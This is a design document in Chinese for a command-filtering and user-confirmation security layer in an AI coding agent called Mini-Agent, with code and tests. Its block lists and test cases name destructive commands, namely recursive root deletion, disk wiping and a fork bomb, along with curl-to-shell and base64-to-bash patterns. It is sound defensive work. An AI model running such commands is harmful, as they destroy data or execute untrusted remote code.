# 安全沙箱与用户确认机制设计文档

> 日期: 2026-06-08
> 状态: 修订中
> 范围: BashTool 沙箱 + 确认，FileTools 安全检查
> 修订记录: 根据代码审查修正 ToolResult 字段、execute 签名、集成细节

## 1. 背景与动机

Mini-Agent 当前没有任何安全防护机制：

- **BashTool** 可以执行任意 shell 命令，无过滤、无确认
- **FileTools** 有工作区隔离，但 BashTool 可绕过
- Agent 执行循环中 LLM 生成工具调用后直接执行，无用户确认步骤
- System prompt 中的安全指南只是建议，不强制执行

参考 Claude Code、OpenAI Codex 等业界实践，需要添加安全层。

## 2. 设计目标

- **防误操作**：个人开发助手场景，重点是防止意外执行危险命令
- **可插拔架构**：先实现命令过滤 + 确认，保留 OS 沙箱扩展能力
- **最小侵入**：不改变现有 Agent 执行循环的核心逻辑
- **配置驱动**：安全规则和行为可通过配置调整

## 3. 整体架构

```
┌───────────────────────────────────────────────────┐
│                    Agent Loop                      │
└────────────────────────┬──────────────────────────┘
                         │ Tool call
                         ▼
┌───────────────────────────────────────────────────┐
│              SecurityMiddleware                    │
│                                                   │
│  BashTool → check_command(command)                │
│  FileTools → check_file_operation(op, path)       │
│                                                   │
│  内部流程:                                         │
│  1. CommandClassifier — 命令风险评估               │
│  2. UserConfirmation — 交互确认 (confirm 级别)     │
│  3. 环境变量清理 + 审计日志                         │
│                                                   │
└────────────────────────┬──────────────────────────┘
                         │ SecurityDecision
                         ▼
┌───────────────────────────────────────────────────┐
│              Tool.execute()                        │
└───────────────────────────────────────────────────┘
```

### 安全决策流程

1. LLM 生成工具调用（bash 命令或文件操作）
2. `SecurityMiddleware` 拦截，进行安全检查
3. 命令分类结果：
   - **SAFE** → 直接执行
   - **CONFIRM** → 暂停，CLI 提示用户确认
   - **DENY** → 直接拒绝，返回错误信息给 LLM
4. 通过检查后执行命令/操作

## 4. 文件结构

```
# 新增文件
mini_agent/security/
├── __init__.py        # 导出 SecurityMiddleware
├── models.py          # RiskLevel, SecurityDecision 数据模型
├── classifier.py      # 命令分类器 + 复合命令解析 + 内置规则集
├── confirm.py         # 交互式用户确认 + 规则持久化
└── middleware.py      # 安全中间件编排 + 环境变量缓存

# 修改的现有文件
mini_agent/config.py   # 新增 SecurityConfig，Config 添加 security 字段
mini_agent/tools/bash_tool.py   # BashTool 接收 security 参数
mini_agent/tools/file_tools.py  # WriteTool/EditTool 接收 security 参数
mini_agent/cli.py      # 创建 SecurityMiddleware，修改 add_workspace_tools
```

P2 后期：`audit.py`（审计日志）、`backends/`（OS 沙箱后端）。

## 5. 核心模块设计

### 5.1 models.py — 数据模型

```python
from enum import IntEnum
from dataclasses import dataclass, field

class RiskLevel(IntEnum):
    """风险等级，值越大越危险，可直接比较大小"""
    SAFE = 0      # 自动放行
    CONFIRM = 1   # 需要用户确认
    DENY = 2      # 直接拒绝

@dataclass
class SecurityDecision:
    """安全检查结果

    单字段设计：allowed=True 表示放行，allowed=False 表示拒绝。
    不使用 allow/deny 双字段避免歧义。
    """
    allowed: bool
    reason: str = ""      # 拒绝/确认的原因
    command: str = ""     # 清理后/包装后的命令（预留，当前等于原命令）
    env: dict = field(default_factory=dict)  # 清理后的环境变量（传给子进程）
```

### 5.2 classifier.py — 命令分类器

#### 内置规则集

```python
# 硬编码在 classifier.py 中，不需要配置文件
BUILTIN_DENY = [
    r"rm\s+-rf\s+/",
    r"rm\s+-rf\s+~",
    r"mkfs",
    r"dd\s+if=.*of=/dev/",
    r":\(\)\{\s*:\|:&\s*\};:",  # fork bomb
]

BUILTIN_ALLOW = [
    r"^git\s+status",
    r"^git\s+diff",
    r"^git\s+log",
    r"^ls\b",
    r"^cat\s",
    r"^head\b",
    r"^tail\b",
    r"^grep\b",
    r"^rg\b",
    r"^find\b",
    r"^wc\b",
    r"^pytest\b",
    r"^echo\s",
    r"^pwd$",
    r"^which\s",
    r"^type\s",
]

BUILTIN_CONFIRM = [
    r"sudo\b",
    r"\bapt\b",
    r"\bbrew\b",
    r"\byum\b",
    r"pip\s+install",
    r"npm\s+install\s+-g",
    r"curl.*\|\s*(ba)?sh",
    r"wget.*\|\s*(ba)?sh",
    r"base64\s+.*-d.*\|",
    r"chmod\s+[0-7]77",
]
```

#### 复合命令解析

```python
class CommandClassifier:
    def classify(self, command: str, mode: str, user_rules: list) -> tuple[RiskLevel, str]:
        """主入口：评估命令危险程度"""

        # 1. 用户自定义规则（最高优先级）
        user_risk = self._check_user_rules(command, user_rules)
        if user_risk:
            return user_risk

        # 2. 拆分复合命令，对每个子命令递归分类，取最高风险
        parts = self._split_compound(command)
        if len(parts) > 1:
            max_risk = RiskLevel.SAFE
            max_reason = ""
            for sub_cmd in parts:
                risk, reason = self.classify(sub_cmd.strip(), mode, user_rules)
                if risk > max_risk:
                    max_risk = risk
                    max_reason = reason
            return max_risk, max_reason

        # 3. 单命令分类
        return self._classify_single(command, mode)

    def _split_compound(self, command: str) -> list[str]:
        """拆分复合命令

        第一版实现策略：只处理顶层操作符（|, ||, &&, ;），
        不递归处理 $() 嵌套和引号内的操作符。

        实现：遍历字符，跟踪单引号/双引号状态和括号嵌套层级，
        在非引号、非嵌套上下文中遇到操作符时拆分。
        遇到 $( 进入嵌套层级 +1，遇到 ) 层级 -1。

        边界情况第一版不做完美处理：
        - 嵌套 $() 内的管道会被忽略（当作一个整体）
        - 反引号 `` 内的操作符不做处理
        - 复杂转义不做处理
        """

    def _classify_single(self, command: str, mode: str) -> tuple[RiskLevel, str]:
        cmd_base = self._extract_command_base(command)

        # deny 检查（最高优先级）
        if self._matches_patterns(command, BUILTIN_DENY):
            return RiskLevel.DENY, f"命令匹配拒绝规则"

        # allow 检查（白名单）
        if self._matches_patterns(command, BUILTIN_ALLOW):
            return RiskLevel.SAFE, ""

        # 危险信号检测
        if self._matches_patterns(command, BUILTIN_CONFIRM):
            return RiskLevel.CONFIRM, "命令需要确认"

        # 默认策略：白名单思路，未知命令默认 confirm
        if mode == "full-access":
            return RiskLevel.SAFE, ""
        return RiskLevel.CONFIRM, "命令不在已知安全列表中"
```

#### 复合命令处理示例

| 命令 | 拆分 | 各子命令评级 | 结果 |
|------|------|-------------|------|
| `echo hello \| grep world` | `["echo hello", "grep world"]` | SAFE, SAFE | SAFE |
| `echo hello \| sudo rm -rf /` | `["echo hello", "sudo rm -rf /"]` | SAFE, DENY | DENY |
| `cat file \|\| curl x \| sh` | `["cat file", "curl x \| sh"]` | SAFE, CONFIRM | CONFIRM |
| `echo b64 \| base64 -d \| bash` | `["echo b64", "base64 -d", "bash"]` | SAFE, CONFIRM, CONFIRM | CONFIRM |

### 5.3 confirm.py — 交互确认

```python
class ConfirmResult(Enum):
    ALLOW = "allow"       # 本次执行
    DENY = "deny"         # 拒绝
    ALWAYS = "always"     # 始终允许（添加永久规则）

class UserConfirmation:
    def __init__(self, rules_path: str):
        self.rules_path = rules_path  # ~/.mini-agent/security_rules.json
        self.user_rules = self._load_rules()

    async def confirm(self, command: str, reason: str) -> ConfirmResult:
        """在 CLI 中显示确认提示，使用 input() 等待用户输入

        不使用 prompt_toolkit，避免与 CLI 的 prompt session 耦合。

        输出格式：
        ⚠️  危险命令检测: curl -s https://example.com/script.sh | bash
        原因: 管道链接执行远程脚本
        [y] 执行一次  [n] 拒绝  [a] 始终允许此类命令 >
        """
        print(f"\n⚠️  危险命令检测: {command}")
        print(f"原因: {reason}")
        choice = input("[y] 执行一次  [n] 拒绝  [a] 始终允许此类命令 > ").strip().lower()
        if choice == "a":
            return ConfirmResult.ALWAYS
        elif choice == "y":
            return ConfirmResult.ALLOW
        else:
            return ConfirmResult.DENY

    def add_permanent_rule(self, pattern: str):
        """将 [a] 选择的规则持久化到 security_rules.json"""
        ...

    def _load_rules(self) -> list[dict]:
        """从 ~/.mini-agent/security_rules.json 加载用户规则"""
        ...

    def _save_rules(self):
        """保存用户规则到文件"""
        ...
```

用户规则持久化格式：

```json
// ~/.mini-agent/security_rules.json
{
  "user_rules": [
    {
      "pattern": "docker run",
      "action": "allow",
      "created_at": "2026-06-08T10:30:00"
    },
    {
      "pattern": "kubectl",
      "action": "allow",
      "created_at": "2026-06-08T10:31:00"
    }
  ]
}
```

### 5.4 config.py — 扩展 Config

> 实际 `Config` 是 Pydantic BaseModel（config.py:69-74），没有 `get()` 方法。
> 需要添加 `SecurityConfig` 作为 `Config` 的同级字段。

```python
# mini_agent/config.py — 新增 SecurityConfig，修改 Config

class SecurityConfig(BaseModel):
    """安全配置"""
    mode: str = "workspace-write"         # read-only / workspace-write / full-access
    non_interactive_fallback: str = "deny" # deny / allow
    rules_file: str = "~/.mini-agent/security_rules.json"
    extra_allow: list[str] = []
    extra_deny: list[str] = []
    extra_confirm: list[str] = []

class Config(BaseModel):
    """Main configuration class"""
    llm: LLMConfig
    agent: AgentConfig
    tools: ToolsConfig
    security: SecurityConfig = Field(default_factory=SecurityConfig)  # 新增

    # from_yaml() 中也需要解析 security 段：
    # security_data = data.get("security", {})
    # security_config = SecurityConfig(
    #     mode=security_data.get("mode", "workspace-write"),
    #     non_interactive_fallback=security_data.get("non_interactive_fallback", "deny"),
    #     rules_file=security_data.get("rules_file", "~/.mini-agent/security_rules.json"),
    #     extra_allow=security_data.get("extra_allow", []),
    #     extra_deny=security_data.get("extra_deny", []),
    #     extra_confirm=security_data.get("extra_confirm", []),
    # )
    # return cls(llm=llm_config, agent=agent_config, tools=tools_config, security=security_config)
```

### 5.5 middleware.py — 安全中间件

```python
from mini_agent.config import SecurityConfig

class SecurityMiddleware:
    def __init__(self, security_config: SecurityConfig, workspace_dir: str, interactive: bool = True):
        """接收 SecurityConfig Pydantic 模型，不是 dict"""
        self.mode = security_config.mode
        self.non_interactive_fallback = security_config.non_interactive_fallback
        self.workspace_dir = workspace_dir
        self.interactive = interactive
        self.classifier = CommandClassifier(
            extra_allow=security_config.extra_allow,
            extra_deny=security_config.extra_deny,
            extra_confirm=security_config.extra_confirm,
        )
        self.confirmation = UserConfirmation(security_config.rules_file)
        # 缓存清理后的环境变量，避免每次调用都遍历 os.environ
        self._clean_env = self._sanitize_env()

    async def check_command(self, command: str) -> SecurityDecision:
        """BashTool 调用入口：检查命令安全性

        返回 SecurityDecision：
        - allowed=True, env=清理后的环境变量 → 可执行
        - allowed=False, reason=拒绝原因 → 不可执行
        """

        # 1. 命令分类
        risk, reason = self.classifier.classify(
            command, self.mode, self.confirmation.user_rules
        )

        if risk == RiskLevel.DENY:
            return SecurityDecision(allowed=False, reason=reason)

        if risk == RiskLevel.CONFIRM:
            if not self.interactive:
                if self.non_interactive_fallback == "deny":
                    return SecurityDecision(allowed=False, reason=f"[非交互模式] {reason}")
                # fallback = "allow" 时放行
            else:
                result = await self.confirmation.confirm(command, reason)
                if result == ConfirmResult.DENY:
                    return SecurityDecision(allowed=False, reason="用户拒绝执行")
                if result == ConfirmResult.ALWAYS:
                    self.confirmation.add_permanent_rule(command)

        # 2. 返回清理后的环境变量（使用缓存）
        return SecurityDecision(allowed=True, command=command, env=self._clean_env)

    async def check_file_operation(self, operation: str, path: str) -> SecurityDecision:
        """FileTools 调用入口：检查文件操作安全性
        operation: 'read' | 'write' | 'edit'
        """
        abs_path = Path(path).resolve()

        # workspace-write 模式：写操作限于工作区内
        if operation in ("write", "edit") and self.mode == "workspace-write":
            if not self._is_within_workspace(abs_path):
                return SecurityDecision(
                    allowed=False,
                    reason=f"路径 {path} 在工作区外，当前模式 ({self.mode}) 不允许"
                )

        # read-only 模式：所有写操作都拒绝
        if operation in ("write", "edit") and self.mode == "read-only":
            return SecurityDecision(
                allowed=False,
                reason="当前为只读模式，不允许写操作"
            )

        # 保护敏感路径
        if self._is_protected_path(abs_path, operation):
            return SecurityDecision(
                allowed=False,
                reason=f"路径 {path} 受保护"
            )

        return SecurityDecision(allowed=True)

    def _sanitize_env(self) -> dict:
        """清理环境变量，移除敏感信息（在 __init__ 中调用一次并缓存）"""
        protected_patterns = ("API_KEY", "SECRET", "TOKEN", "PASSWORD", "CREDENTIAL", "PRIVATE_KEY")
        return {
            k: v for k, v in os.environ.items()
            if not any(p in k.upper() for p in protected_patterns)
        }

    def _is_within_workspace(self, path: Path) -> bool:
        try:
            path.relative_to(Path(self.workspace_dir).resolve())
            return True
        except ValueError:
            return False

    def _is_protected_path(self, path: Path, operation: str) -> bool:
        """检查是否为系统敏感路径"""
        protected = [
            "/etc/passwd", "/etc/shadow", "/etc/sudoers",
            "/.ssh/", "/.gnupg/",
            "/.env", "/credentials", "/.aws/",
        ]
        path_str = str(path)
        return any(p in path_str for p in protected)
```

## 6. 与现有代码集成

> 本节代码基于实际代码审查修正，与当前代码库一致。
> 关键约束：
> - `ToolResult(success: bool, content: str = "", error: str | None = None)` — 见 base.py:8-13
> - Agent 调用工具方式：`await tool.execute(**arguments)` — 见 agent.py:468
> - BashTool 返回 `BashOutputResult`（继承 ToolResult）— 见 bash_tool.py:18

### BashTool 集成

```python
# mini_agent/tools/bash_tool.py — 修改 BashTool

class BashTool(Tool):
    def __init__(self, workspace_dir: str | None = None, security: SecurityMiddleware | None = None):
        self.is_windows = platform.system() == "Windows"
        self.shell_name = "PowerShell" if self.is_windows else "bash"
        self.workspace_dir = workspace_dir
        self.security = security  # 新增，可选（向后兼容）

    async def execute(
        self,
        command: str,
        timeout: int = 120,
        run_in_background: bool = False,
    ) -> ToolResult:
        """execute 签名保持不变（关键字参数），与 agent.py:468 的 **arguments 调用方式一致"""

        # 安全检查（如果配置了 security）
        decision = None
        if self.security:
            decision = await self.security.check_command(command)
            if not decision.allowed:
                return BashOutputResult(
                    success=False,
                    error=f"命令被安全策略拒绝: {decision.reason}",
                    stdout="",
                    stderr="",
                    exit_code=-1,
                )

        try:
            # 原有执行逻辑不变，但需要传入清理后的 env
            if self.is_windows:
                shell_cmd = ["powershell.exe", "-NoProfile", "-Command", command]
            else:
                shell_cmd = command

            # decision 存在时使用清理后的 env，否则不传 env（继承当前进程环境）
            env = decision.env if decision else None

            if run_in_background:
                process = await asyncio.create_subprocess_shell(
                    shell_cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT,
                    cwd=self.workspace_dir,
                    env=env,
                )
                # ... 其余背景执行逻辑不变
            else:
                process = await asyncio.create_subprocess_shell(
                    shell_cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    cwd=self.workspace_dir,
                    env=env,
                )
                # ... 其余前台执行逻辑不变
```

### FileTools 集成

```python
# mini_agent/tools/file_tools.py — 修改 WriteTool 和 EditTool

class WriteTool(Tool):
    def __init__(self, workspace_dir: str = ".", security: SecurityMiddleware | None = None):
        self.workspace_dir = Path(workspace_dir).absolute()
        self.security = security  # 新增，可选（向后兼容）

    async def execute(self, path: str, content: str) -> ToolResult:
        """execute 签名保持不变（关键字参数 path, content）"""
        try:
            file_path = Path(path)
            if not file_path.is_absolute():
                file_path = self.workspace_dir / file_path

            # 安全检查
            if self.security:
                decision = await self.security.check_file_operation("write", str(file_path))
                if not decision.allowed:
                    return ToolResult(success=False, error=f"操作被安全策略拒绝: {decision.reason}")

            # 原有写文件逻辑不变
            file_path.parent.mkdir(parents=True, exist_ok=True)
            file_path.write_text(content, encoding="utf-8")
            return ToolResult(success=True, content=f"Successfully wrote to {file_path}")
        except Exception as e:
            return ToolResult(success=False, error=str(e))

class EditTool(Tool):
    def __init__(self, workspace_dir: str = ".", security: SecurityMiddleware | None = None):
        self.workspace_dir = Path(workspace_dir).absolute()
        self.security = security  # 新增

    async def execute(self, path: str, old_str: str, new_str: str) -> ToolResult:
        """execute 签名保持不变（关键字参数 path, old_str, new_str）"""
        try:
            file_path = Path(path)
            if not file_path.is_absolute():
                file_path = self.workspace_dir / file_path

            if not file_path.exists():
                return ToolResult(success=False, error=f"File not found: {path}")

            # 安全检查
            if self.security:
                decision = await self.security.check_file_operation("edit", str(file_path))
                if not decision.allowed:
                    return ToolResult(success=False, error=f"操作被安全策略拒绝: {decision.reason}")

            # 原有编辑逻辑不变
            content = file_path.read_text(encoding="utf-8")
            if old_str not in content:
                return ToolResult(success=False, error=f"Text not found in file: {old_str}")
            new_content = content.replace(old_str, new_str)
            file_path.write_text(new_content, encoding="utf-8")
            return ToolResult(success=True, content=f"Successfully edited {file_path}")
        except Exception as e:
            return ToolResult(success=False, error=str(e))
```

### CLI 集成

```python
# mini_agent/cli.py — 在 run_agent() 函数中修改（cli.py:487）

# run_agent(workspace_dir: Path, task: str = None) 内部
# 注意：args 在 main() 中，run_agent 只有 task 参数
# 非交互模式由 task is not None 决定（cli.py:627: if task:）

from mini_agent.security import SecurityMiddleware

# 在 config 加载之后（cli.py:527 附近）
# 创建安全中间件，用 task 判断是否为交互模式
security = SecurityMiddleware(config.security, str(workspace_dir), interactive=(task is None))

# 修改 add_workspace_tools 调用，传入 security
add_workspace_tools(tools, config, workspace_dir, security)
```

同时修改 `add_workspace_tools` 函数签名（cli.py:435）：

```python
def add_workspace_tools(tools: List[Tool], config: Config, workspace_dir: Path,
                        security: SecurityMiddleware | None = None):
    """Add workspace-dependent tools"""

    workspace_dir.mkdir(parents=True, exist_ok=True)

    if config.tools.enable_bash:
        bash_tool = BashTool(workspace_dir=str(workspace_dir), security=security)
        tools.append(bash_tool)
        print(f"{Colors.GREEN}✅ Loaded Bash tool (cwd: {workspace_dir}){Colors.RESET}")

    if config.tools.enable_file_tools:
        tools.extend([
            ReadTool(workspace_dir=str(workspace_dir)),
            WriteTool(workspace_dir=str(workspace_dir), security=security),
            EditTool(workspace_dir=str(workspace_dir), security=security),
        ])
        print(f"{Colors.GREEN}✅ Loaded file operation tools (workspace: {workspace_dir}){Colors.RESET}")

    # ... 其余不变
```

### LLM 重试行为

- 拒绝命令 → 返回 `ToolResult(success=False, error="命令被安全策略拒绝: ...")`
- LLM 看到错误信息后可选择更安全的替代方案
- 不需要特殊重试限制，现有 token 管理已防止无限循环
- 被拒绝的操作会作为上下文保留，LLM 能学习避免类似操作

## 7. 配置

### config.yaml 新增部分

```yaml
security:
  # 安全模式
  #   read-only:      只允许读操作
  #   workspace-write: 写操作限制在工作区内（默认）
  #   full-access:     不限制路径，未知命令自动放行
  mode: "workspace-write"

  # 非交互模式下 confirm 级别命令的 fallback 行为
  #   deny: 自动拒绝（默认，更安全）
  #   allow: 自动放行
  non_interactive_fallback: "deny"

  # 可选：用户自定义规则（覆盖内置规则）
  extra_allow: []
  extra_deny: []
  extra_confirm: []
```

### 内置规则

内置规则硬编码在 `classifier.py` 中，不需要用户配置。大部分用户使用默认配置即可。

### 用户持久化规则

通过 CLI 交互中的 `[a] 始终允许` 选项自动保存到 `~/.mini-agent/security_rules.json`。

## 8. 实现优先级

### P0 — 必须有

| 文件 | 内容 |
|------|------|
| `config.py` | 新增 SecurityConfig，扩展 Config |
| `models.py` | RiskLevel, SecurityDecision 数据模型 |
| `classifier.py` | 三层分类 + 复合命令解析 + 内置规则集 |
| `confirm.py` | 交互确认 + 规则持久化 |
| `middleware.py` | 编排 + check_command + check_file_operation + 环境变量缓存 |
| `bash_tool.py` | BashTool 集成 SecurityMiddleware，env 传递 |
| `file_tools.py` | WriteTool/EditTool 集成 SecurityMiddleware |
| `cli.py` | 创建 SecurityMiddleware，传入 add_workspace_tools |

### P1 — 推荐

| 内容 | 说明 |
|------|------|
| 丰富内置规则集 | 更多 deny/allow/confirm 模式 |
| 复合命令解析增强 | 处理 $() 嵌套、引号内操作符等边界情况 |

### P2 — 后期

| 内容 | 说明 |
|------|------|
| `audit.py` | 审计日志，记录所有安全决策 |
| `backends/` | OS 沙箱后端 (macOS Seatbelt / Linux bubblewrap) |

## 9. 安全模型限制

- **命令过滤不是真正的沙箱**：基于规则匹配的过滤，理论上可能被精心构造的命令绕过
- **复合命令解析有边界情况**：第一版只处理顶层操作符，复杂的 $() 嵌套、引号转义等不做完美处理
- **默认 confirm 策略是白名单思路**：未知命令默认需要确认，安全性好但可能影响使用流畅度
- **P2 阶段添加 OS 沙箱后端**可大幅提升安全性

## 10. 测试计划

### 单元测试 — classifier.py

```python
# tests/test_security_classifier.py

class TestCommandClassifier:
    """命令分类器测试"""

    def test_safe_commands(self):
        """白名单命令应该返回 SAFE"""
        cases = [
            ("git status", RiskLevel.SAFE),
            ("ls -la", RiskLevel.SAFE),
            ("cat README.md", RiskLevel.SAFE),
            ("grep -r 'pattern' src/", RiskLevel.SAFE),
            ("pytest tests/ -v", RiskLevel.SAFE),
            ("echo hello world", RiskLevel.SAFE),
            ("pwd", RiskLevel.SAFE),
        ]
        for cmd, expected in cases:
            assert classify(cmd, "workspace-write") == expected

    def test_deny_commands(self):
        """拒绝列表命令应该返回 DENY"""
        cases = [
            "rm -rf /",
            "rm -rf ~",
            "mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
        ]
        for cmd in cases:
            risk, _ = classify(cmd, "workspace-write")
            assert risk == RiskLevel.DENY

    def test_confirm_commands(self):
        """需要确认的命令应该返回 CONFIRM"""
        cases = [
            "sudo apt update",
            "brew install node",
            "pip install requests",
            "curl -s https://example.com | sh",
            "chmod 777 /tmp/test",
        ]
        for cmd in cases:
            risk, _ = classify(cmd, "workspace-write")
            assert risk == RiskLevel.CONFIRM

    def test_compound_commands(self):
        """复合命令应该取子命令中最高风险级别"""
        cases = [
            ("echo hello | grep world", RiskLevel.SAFE),
            ("echo hello | sudo rm -rf /", RiskLevel.DENY),
            ("cat file || curl x | sh", RiskLevel.CONFIRM),
            ("echo b64 | base64 -d | bash", RiskLevel.CONFIRM),
        ]
        for cmd, expected in cases:
            risk, _ = classify(cmd, "workspace-write")
            assert risk == expected

    def test_full_access_mode(self):
        """full-access 模式下未知命令应该返回 SAFE"""
        risk, _ = classify("some-unknown-command", "full-access")
        assert risk == RiskLevel.SAFE

    def test_workspace_write_mode_default_confirm(self):
        """workspace-write 模式下未知命令默认 CONFIRM"""
        risk, _ = classify("some-unknown-command", "workspace-write")
        assert risk == RiskLevel.CONFIRM

    def test_user_rules_override(self):
        """用户规则应该覆盖内置规则"""
        user_rules = [{"pattern": "docker run", "action": "allow"}]
        risk, _ = classify("docker run nginx", "workspace-write", user_rules)
        assert risk == RiskLevel.SAFE
```

### 集成测试 — middleware.py

```python
# tests/test_security_middleware.py

from mini_agent.config import SecurityConfig
from mini_agent.security.middleware import SecurityMiddleware

class TestSecurityMiddleware:
    """安全中间件集成测试"""

    def _make_middleware(self, **kwargs) -> SecurityMiddleware:
        """辅助方法：创建 middleware 实例"""
        config = SecurityConfig(**kwargs)
        return SecurityMiddleware(config, "/workspace", interactive=True)

    async def test_check_command_deny(self):
        """拒绝命令返回 allowed=False"""
        middleware = self._make_middleware()
        decision = await middleware.check_command("rm -rf /")
        assert not decision.allowed
        assert decision.reason

    async def test_check_command_safe(self):
        """安全命令返回 allowed=True"""
        middleware = self._make_middleware()
        decision = await middleware.check_command("git status")
        assert decision.allowed

    async def test_check_command_non_interactive_deny(self):
        """非交互模式下 confirm 命令默认拒绝"""
        config = SecurityConfig(non_interactive_fallback="deny")
        middleware = SecurityMiddleware(config, "/workspace", interactive=False)
        decision = await middleware.check_command("sudo apt update")
        assert not decision.allowed

    async def test_check_command_non_interactive_allow(self):
        """非交互模式下 confirm 命令可配置为放行"""
        config = SecurityConfig(non_interactive_fallback="allow")
        middleware = SecurityMiddleware(config, "/workspace", interactive=False)
        decision = await middleware.check_command("sudo apt update")
        assert decision.allowed

    async def test_check_file_operation_within_workspace(self):
        """工作区内文件操作应该允许"""
        middleware = self._make_middleware()
        decision = await middleware.check_file_operation("write", "/workspace/test.py")
        assert decision.allowed

    async def test_check_file_operation_outside_workspace(self):
        """工作区外文件写操作应该拒绝"""
        middleware = self._make_middleware()
        decision = await middleware.check_file_operation("write", "/etc/passwd")
        assert not decision.allowed

    async def test_check_file_operation_read_only_mode(self):
        """read-only 模式下写操作应该拒绝"""
        config = SecurityConfig(mode="read-only")
        middleware = SecurityMiddleware(config, "/workspace", interactive=True)
        decision = await middleware.check_file_operation("write", "/workspace/test.py")
        assert not decision.allowed

    async def test_sanitize_env(self):
        """环境变量清理应该移除敏感变量"""
        middleware = self._make_middleware()
        env = middleware._clean_env
        for key in env:
            assert not any(p in key.upper() for p in
                ("API_KEY", "SECRET", "TOKEN", "PASSWORD", "CREDENTIAL"))

    async def test_check_command_returns_env(self):
        """通过的命令应该携带清理后的环境变量"""
        middleware = self._make_middleware()
        decision = await middleware.check_command("git status")
        assert decision.allowed
        assert isinstance(decision.env, dict)
```

### 功能测试 — confirm.py

```python
# tests/test_security_confirm.py

class TestUserConfirmation:
    """用户确认和规则持久化测试"""

    def test_load_rules(self, tmp_path):
        """应该正确加载规则文件"""
        rules_file = tmp_path / "rules.json"
        rules_file.write_text(json.dumps({
            "user_rules": [{"pattern": "docker", "action": "allow"}]
        }))
        confirmation = UserConfirmation(str(rules_file))
        assert len(confirmation.user_rules) == 1

    def test_save_rules(self, tmp_path):
        """应该正确保存规则到文件"""
        rules_file = tmp_path / "rules.json"
        confirmation = UserConfirmation(str(rules_file))
        confirmation.add_permanent_rule("docker run")
        saved = json.loads(rules_file.read_text())
        assert len(saved["user_rules"]) == 1
        assert saved["user_rules"][0]["pattern"] == "docker run"

    def test_load_nonexistent_rules(self, tmp_path):
        """规则文件不存在时应该返回空列表"""
        confirmation = UserConfirmation(str(tmp_path / "nonexistent.json"))
        assert confirmation.user_rules == []
```
